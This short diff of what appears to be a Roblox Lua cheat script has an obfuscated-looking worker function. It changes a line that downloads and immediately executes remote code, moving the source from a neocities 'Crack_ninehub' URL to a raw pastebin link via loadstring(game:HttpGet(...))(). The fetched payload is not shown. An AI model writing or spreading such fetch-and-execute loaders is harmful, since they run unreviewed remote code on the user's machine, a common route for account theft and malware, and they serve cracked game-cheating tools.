@@ -30,4 +30,4 @@ task.spawn(function()
     _0x_DO_WORK()
 end)
 
-loadstring(game:HttpGet("https://sk-delt4.neocities.org/Crack_ninehub.lol"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/647fff8N"))()
